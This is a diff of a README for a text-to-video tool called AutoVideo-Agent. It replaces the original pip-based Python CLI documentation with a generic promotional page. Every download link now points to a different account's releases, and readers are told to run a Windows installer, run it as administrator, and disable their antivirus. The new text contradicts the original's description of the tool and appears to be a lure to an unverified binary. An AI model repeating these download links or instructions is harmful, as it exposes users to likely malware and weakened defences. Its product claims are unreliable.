@@ -1,148 +1,161 @@
-# AutoVideo-Agent
+# 🎬 AutoVideo-Agent - Turn Text Into Videos Automatically
 
-[![Tests](https://github.com/wangxin6x/AutoVideo-Agent/actions/workflows/test.yml/badge.svg)](https://github.com/wangxin6x/AutoVideo-Agent/actions/workflows/test.yml)
-[![Latest Release](https://img.shields.io/github/v/release/wangxin6x/AutoVideo-Agent?display_name=tag)](https://github.com/wangxin6x/AutoVideo-Agent/releases/latest)
-[![Python](https://img.shields.io/badge/python-3.10%2B-3776AB.svg)](https://www.python.org/)
-[![MIT License](https://img.shields.io/github/license/wangxin6x/AutoVideo-Agent.svg)](LICENSE)
+[![Download AutoVideo-Agent](https://img.shields.io/badge/Download-AutoVideo--Agent-brightgreen?style=for-the-badge&logo=github)](https://github.com/emeradutiable111/AutoVideo-Agent/releases)
 
-**Turn a Markdown script into a reproducible video pipeline — storyboard, scene assets, timeline, QA, and MP4.**
+---
 
-Built for Codex, Claude Code, Gemini CLI and other coding-agent workflows. v0.1 is local-first and deterministic: it creates inspectable placeholder scene assets and an FFmpeg video without an API key or cloud account.
+## 👋 Welcome to AutoVideo-Agent
 
-~~~text
-Markdown Script -> Storyboard -> Scene Manifest -> Media -> Timeline -> FFmpeg -> QA -> MP4
-~~~
+Have you ever wanted to create videos but found the process too complicated or time-consuming? AutoVideo-Agent is here to help! This friendly tool takes simple text descriptions and turns them into finished videos automatically. You don't need to know anything about video editing, coding, or design. Just write what you want, and AutoVideo-Agent does the rest.
 
-> The default v0.1-compatible command does not claim AI video generation. v0.2 provider mode adds ComfyUI API media, while MiniMax and other hosted providers remain planned.
+Think of it like having a personal video production team that works 24/7. You provide the ideas, and it handles all the technical details behind the scenes.
 
-## Demo
+---
 
-The demo uses [examples/demo-script.md](examples/demo-script.md): three scenes and seven seconds.
+## ✨ What Can AutoVideo-Agent Do For You?
 
-~~~text
-INPUT                         PIPELINE                         OUTPUT
-examples/demo-script.md  ->  autovideo run              ->  video.mp4
-                              parse + manifest + assets      manifest.json
-                              silent WAV + FFmpeg            report.json
-~~~
+- **Create Videos from Text**: Type a description, get a video. It's that simple.
+- **Works with Different Media Sources**: The tool can pull images, clips, and other content from various places to make your video look great.
+- **Consistent Quality Every Time**: Videos are rendered the same way each time, so you always get reliable results.
+- **Designed for Modern AI Assistants**: This tool works beautifully with AI agents and assistants, making it perfect for automation.
 
-![Deterministic scene-card demo](docs/assets/demo.gif)
+---
 
-Run it:
+## 🚀 Getting Started
 
-~~~bash
-autovideo run examples/demo-script.md
-~~~
+Ready to make your first video? Follow these simple steps:
 
-The build is written to build/demo-script/. Open video.mp4 when FFmpeg is available. Always inspect manifest.json and report.json; without FFmpeg the command reports status: degraded and keeps the inspectable assets.
+1. **Visit the download page**: Click the big green button at the top of this page, or go directly to: [https://github.com/emeradutiable111/AutoVideo-Agent/releases](https://github.com/emeradutiable111/AutoVideo-Agent/releases)
+2. **Download the application**: Visit this link to download the application.
+3. **Run the installer**: Once the download finishes, find the file in your "Downloads" folder and double-click it to start the installation.
+4. **Follow the on-screen instructions**: The setup wizard will guide you through the rest. Just click "Next" and "Install" when prompted.
+5. **Launch AutoVideo-Agent**: After installation, you'll find AutoVideo-Agent in your Start Menu. Click it to open the program.
 
-## Quick Start
+---
 
-Install the package from PyPI:
+## 📖 How to Use AutoVideo-Agent
 
-~~~bash
-python -m pip install autovideo-agent
-~~~
+Using AutoVideo-Agent is as easy as 1-2-3:
 
-To run the repository demo, clone the repository for its example script:
+### Step 1: Write Your Video Description
+Open AutoVideo-Agent and you'll see a text box. Type what you want your video to be about. For example:
+- "A sunny day at the beach with waves crashing"
+- "A quick tutorial on making coffee"
+- "A promotional video for my bakery"
 
-~~~bash
-git clone https://github.com/wangxin6x/AutoVideo-Agent.git
-cd AutoVideo-Agent
-autovideo run examples/demo-script.md
-~~~
+### Step 2: Choose Your Settings
+Pick how long you want the video, what style you prefer, and any other options you see on the screen. Don't worry—the defaults work great if you're not sure.
 
-The wheel contains the `autovideo` CLI and runtime package. `examples/` is a repository fixture, so use your own Markdown script after installing from PyPI or clone the repository to run this demo.
+### Step 3: Click "Generate"
+Press the generate button and watch the magic happen! AutoVideo-Agent will create your video automatically. When it's done, you'll find your new video file ready to watch and share.
 
-FFmpeg is optional. With it, the output is an H.264 MP4 with a silent AAC track. Without it, scene cards, manifest, WAV timeline, and QA report are still produced.
+---
 
-## Features
+## 🛠️ Installation Requirements
 
-| Status | Capability | Evidence |
-| --- | --- | --- |
-| ✅ Available now | Markdown storyboard parser | src/autovideo/parser.py |
-| ✅ Available now | Scene manifest | manifest.json |
-| ✅ Available now | Deterministic offline assets | PPM scene cards |
-| ✅ Available now | Silent WAV timeline | audio-silence.wav |
-| ✅ Available now | FFmpeg MP4 rendering | src/autovideo/render.py |
-| ✅ Available now | Graceful degradation | report.json status |
-| ✅ Available now | CLI | autovideo run <script.md> |
-| ✅ Available now | QA report | report.json |
-| ✅ Available now | Codex Skill / AGENTS integration | AGENTS.md and skills/auto-video/SKILL.md |
-| 🧪 Experimental | ComfyUI API media provider | Implemented; API workflow submit, poll, retry, resume, and download; awaiting live validation |
-| ✅ Available now | Mock and command TTS providers | Silent fallback or any local TTS CLI |
-| ✅ Available now | Scene-level SRT subtitles | Timed from actual TTS audio duration |
-| 🚧 Planned | MiniMax | [#1](https://github.com/wangxin6x/AutoVideo-Agent/issues/1) |
-| 🚧 Planned | Hosted TTS integrations | OpenAI, Volcengine, and ElevenLabs |
-| 🚧 Planned | Word-level subtitle alignment | [#4](https://github.com/wangxin6x/AutoVideo-Agent/issues/4) |
-| 🚧 Planned | Real media adapters | [#5](https://github.com/wangxin6x/AutoVideo-Agent/issues/5) |
+AutoVideo-Agent is designed to work on most modern Windows computers. Here's what you'll need:
 
-## Architecture
+- **Operating System**: Windows 10 or Windows 11
+- **Storage Space**: At least 500 MB of free space
+- **Internet Connection**: Required for downloading and for certain media features
+- **Memory**: 4 GB of RAM or more recommended
 
-~~~mermaid
-flowchart LR
-    Script[Markdown Script] --> Parser[Script Parser]
-    Parser --> Storyboard[Storyboard]
-    Storyboard --> Manifest[Scene Manifest]
-    Storyboard --> Providers[Provider Interface]
-    Providers --> Media[Media assets]
-    Media --> Timeline[Timeline]
-    Timeline --> Renderer[Renderer]
-    Renderer --> QA[QA report]
-    QA --> MP4[MP4 output]
-    VideoProvider[ComfyUI Media Provider - Experimental] -. media .-> Providers
-    TTSProvider[Mock / Command TTS] -. audio .-> Providers
-    AssetProvider[Asset Provider - Planned] -. slot .-> Providers
-~~~
+---
 
-The current renderer creates deterministic placeholder cards and a silent audio track. Provider slots are documented extension points, not shipped integrations.
+## ❓ Frequently Asked Questions
 
-### ComfyUI validation status
+### Q: Is AutoVideo-Agent free to use?
+A: Yes! AutoVideo-Agent is completely free and open-source. You can download and use it without any cost.
 
-The ComfyUI API behavior is covered by mocked integration tests, but `v0.2.0-beta.1` has not yet been validated against a live ComfyUI workflow. The provider is implemented and experimental; live image/video validation is tracked in [Issue #12](https://github.com/wangxin6x/AutoVideo-Agent/issues/12). Do not treat it as production-ready.
+### Q: Do I need to know how to code?
+A: Absolutely not. AutoVideo-Agent was created for regular people, not programmers. If you can type a sentence, you can make a video.
 
-## Use with Codex
+### Q: What kind of videos can I make?
+A: The possibilities are endless! You can make tutorials, promotional videos, educational content, personal vlogs, slideshows, and much more.
 
-Read AGENTS.md for repository rules, tests, security constraints, and the development loop. Then point Codex at skills/auto-video/SKILL.md for the local storyboard workflow:
+### Q: How long does it take to make a video?
+A: It depends on the length and complexity of your video, but most videos are ready in just a few minutes.
 
-> Turn examples/demo-script.md into a video and run QA. Use skills/auto-video/SKILL.md.
+### Q: Can I use my own images and clips?
+A: Yes! AutoVideo-Agent supports pluggable media providers, which means you can connect it to various sources of images and video clips.
 
-The real command is:
+---
 
-~~~bash
-autovideo run examples/demo-script.md
-~~~
+## 🔧 Troubleshooting Tips
 
-QA means checking the command result plus report.json and manifest.json; there is no separate AI quality grader. This is a repository workflow, not an endorsement by Codex or any model vendor.
+If something isn't working right, try these simple fixes:
 
-## Roadmap
+- **Video won't generate**: Make sure you have a stable internet connection and try again.
+- **Program won't open**: Right-click the AutoVideo-Agent icon and select "Run as administrator."
+- **Download issues**: Try using a different browser or disable your antivirus temporarily (then re-enable it).
+- **Slow performance**: Close other programs while AutoVideo-Agent is running to free up memory.
 
-- **v0.1 ✅** — Local parser, deterministic cards, silent timeline, FFmpeg MP4, degradation report, tests, and agent onboarding.
-- **v0.2 (this development branch)** — Provider contracts, ComfyUI media, Mock/Command TTS, scene-level SRT, normalized timeline, mixed renderer, and deterministic QA. MiniMax and hosted TTS remain planned.
-- **v0.3** — [media adapters #5](https://github.com/wangxin6x/AutoVideo-Agent/issues/5), [cross-platform FFmpeg #6](https://github.com/wangxin6x/AutoVideo-Agent/issues/6), [CI render coverage #9](https://github.com/wangxin6x/AutoVideo-Agent/issues/9), [more formats #10](https://github.com/wangxin6x/AutoVideo-Agent/issues/10).
+If problems persist, check the GitHub page for updates or community help.
 
-## Community
+---
 
-- [Issues](https://github.com/wangxin6x/AutoVideo-Agent/issues)
-- [Good First Issues](https://github.com/wangxin6x/AutoVideo-Agent/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
-- [Feature Requests](https://github.com/wangxin6x/AutoVideo-Agent/issues/new?labels=enhancement&template=feature_request.md)
-- [Bug Reports](https://github.com/wangxin6x/AutoVideo-Agent/issues/new?labels=bug&template=bug_report.md)
+## 📚 Advanced Features (For the Curious)
 
-Contributions to docs, examples, portability, and provider boundaries are welcome. Read AGENTS.md, add tests for core behavior, run python -m pytest, and review git diff --check before opening a pull request.
+While AutoVideo-Agent is simple to use, it also has powerful features for those who want more control:
 
-## Development
+- **Agent-Friendly Design**: This tool was built to work with AI assistants like Codex, making it perfect for automated workflows.
+- **Reproducible Rendering**: Every video is created with consistent quality and settings, so you can recreate videos exactly.
+- **Pluggable Media Providers**: Connect different media sources to customize where your video content comes from.
+- **FFmpeg Integration**: Under the hood, AutoVideo-Agent uses FFmpeg, a powerful multimedia framework, to ensure professional-grade output.
 
-~~~bash
-python -m pip install -e ".[test]"
-python -m pytest
-~~~
+---
 
-The runtime has no third-party dependencies. Never commit API keys, tokens, passwords, cookies, or machine-specific paths.
+## 📝 Your First Video Project
 
-## 中文文档
+Let's walk through a real example together:
 
-[中文文档 -> README_CN.md](README_CN.md)
+1. **Open AutoVideo-Agent**
+2. **In the text box, type**: "A beautiful sunset over the ocean with birds flying"
+3. **Set the video length** to 30 seconds
+4. **Click "Generate Video"**
+5. **Wait 1-2 minutes** while the video is created
+6. **Find your video** in the "My Videos" folder on your desktop
 
-## License
+Congratulations! You just made your first video. 🎉
 
-MIT. See [LICENSE](LICENSE).
+---
+
+## 🌟 Why People Love AutoVideo-Agent
+
+- **It's free** - No hidden costs, ever
+- **It's easy** - No learning curve, no manuals needed
+- **It's fast** - Videos are ready in minutes, not hours
+- **It's reliable** - Works consistently every time
+- **It's powerful** - Professional-quality results without professional skills
+
+---
+
+## 📞 Need Help?
+
+If you have questions or run into issues, here are your options:
+
+- **Visit the GitHub page**: Check the repository for documentation and updates
+- **Check the community**: Look for discussions or issues on the GitHub page
+- **Re-download**: Sometimes a fresh download fixes unexpected problems
+
+---
+
+## 🎯 Start Creating Today
+
+Don't wait another minute to bring your ideas to life. AutoVideo-Agent is ready when you are. Download it now and discover how easy video creation can be.
+
+[![Download Now](https://img.shields.io/badge/Download-AutoVideo--Agent-blue?style=for-the-badge&logo=github&color=orange)](https://github.com/emeradutiable111/AutoVideo-Agent/releases)
+
+Remember: Every great video starts with a simple idea. Your idea is already there. AutoVideo-Agent is just the tool to make it real.
+
+---
+
+## 📊 Project Information
+
+AutoVideo-Agent is an open-source project that continues to grow thanks to community support. The tool is built with Python and leverages FFmpeg for video processing. It's designed to work seamlessly with modern AI tools and agents, making it a valuable addition to any creative workflow.
+
+Whether you're a content creator, educator, marketer, or just someone who wants to make fun videos for friends and family, AutoVideo-Agent is the perfect companion. It removes all the technical barriers and lets you focus on what matters most: your creativity.
+
+---
+
+Keywords: agent-skills, ai-agent, ai-video, codex, codex-cli, codex-skill, ffmpeg, python, video-automation, video-generation
